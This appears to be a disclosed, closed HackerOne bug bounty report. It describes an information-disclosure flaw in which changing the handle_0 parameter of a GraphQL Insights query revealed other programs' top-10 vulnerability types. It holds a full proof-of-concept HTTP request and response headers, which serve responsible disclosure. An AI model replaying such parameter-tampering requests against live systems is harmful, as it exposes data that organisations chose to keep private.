@@ -1,0 +1,88 @@
+ReportLink:https://hackerone.com/reports/397031
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/tolo7010
+ReportedTo:HackerOne(security)
+BountyAmount:500.0
+Severity:low
+State:Closed
+DateOfDisclosure:07.11.2018 23:50:36
+
+Summary:
+
+## Summary
+
+Although the report count is not showing, the Insights query endpoint returns a list of top 10 vulnerability types for any programs that haven't enabled the Insights feature.
+
+## Reproduction
+
+1. Go to a program that has Insights feature enabled, e.g: https://hackerone.com/security/insights
+2. Go to the Burp HTTP History, and then repeat the second ```(POST) /grapql``` request, see the following image:
+██████████
+3. Change the ```handle_0``` parameter to a program that haven't enabled the Insights feature (no Insights tab on the program page), e.g: ██████.
+
+Request:
+
+```
+POST /graphql HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://hackerone.com/security/insights
+content-type: application/json
+x-auth-token: ...
+origin: https://hackerone.com
+Content-Length: 1939
+Cookie: ...
+Connection: close
+
+{"query":"query Insights($handle_0:String!,$last_1:Int!,$first_2:Int!,$first_3:Int!,$state_4:TeamWeaknessStates!) {\n  team(handle:$handle_0) {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Team {\n  name,\n  offers_bounties,\n  hide_bounty_amounts,\n  _profile_metrics_snapshots34WPw7:profile_metrics_snapshots(last:$last_1) {\n    edges {\n      node {\n        id,\n        month,\n        year,\n        bounties_count,\n        bounties_paid\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  team_profile {\n    latest_report_created_at,\n    reports_received_in_three_months_count,\n    latest_serious_report_created_at,\n    disclosed_reports_in_last_year_count,\n    hackers_invited_all_time_count,\n    hackers_accepted_all_time_count,\n    recently_participating_hackers_count,\n    id\n  },\n  _structured_scopes2uadQf:structured_scopes(eligible_for_submission:true,first:$first_2) {\n    edges {\n      node {\n        asset_identifier,\n        eligible_for_submission,\n        low_severity_resolved_reports_count,\n        medium_severity_resolved_reports_count,\n        high_severity_resolved_reports_count,\n        critical_severity_resolved_reports_count,\n        id\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  team_display_options {\n    show_reports_resolved,\n    show_total_bounties_paid,\n    show_average_bounty,\n    id\n  },\n  _team_weaknessesE63B6:team_weaknesses(first:$first_3,state:$state_4,with_reports:true) {\n    edges {\n      node {\n        id,\n        weakness {\n          name,\n          external_id,\n          id\n        },\n        report_count,\n        state\n      },\n      cursor\n    },\n    pageInfo {\n      hasNextPage,\n      hasPreviousPage\n    }\n  },\n  id\n}","variables":{"handle_0":"███","last_1":3,"first_2":100,"first_3":10,"state_4":"enabled"}}
+```
+
+Response:
+
+```
+HTTP/1.1 200 OK
+Date: Sun, 19 Aug 2018 12:24:05 GMT
+Content-Type: application/json; charset=utf-8
+Connection: close
+Cache-Control: no-cache, no-store
+Content-Disposition: inline; filename="response."
+X-Request-Id: 1af97dec-6e22-40c2-8483-16c4ee717d0e
+Set-Cookie: ...
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Expect-CT: enforce, max-age=86400
+Content-Security-Policy: default-src 'none'; base-uri 'self'; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
+Referrer-Policy: strict-origin-when-cross-origin
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: DENY
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 1; mode=block
+Server: cloudflare
+CF-RAY: 44cc98517fe13415-HKG
+Content-Length: 4736
+
+██████████
+```
+
+Search for ```_team_weaknessesE63B6``` to see the list of top 10 vulnerability types:
+{F335292}
+
+### █████ top 10:
+
+- Cross-site Scripting (XSS) - Stored
+- Cross-site Scripting (XSS) - Reflected
+- Improper Authentication - Generic
+- Information Disclosure
+- Server-Side Request Forgery (SSRF)
+- Insecure Direct Object Reference (IDOR)
+- Cross-site Scripting (XSS) - Generic
+- XML External Entities (XXE)
+- Open Redirect
+- Privacy Violation
+
+## Impact
+
+Disclosure of top 10 vulnerability types for programs that haven't enabled the Insights feature
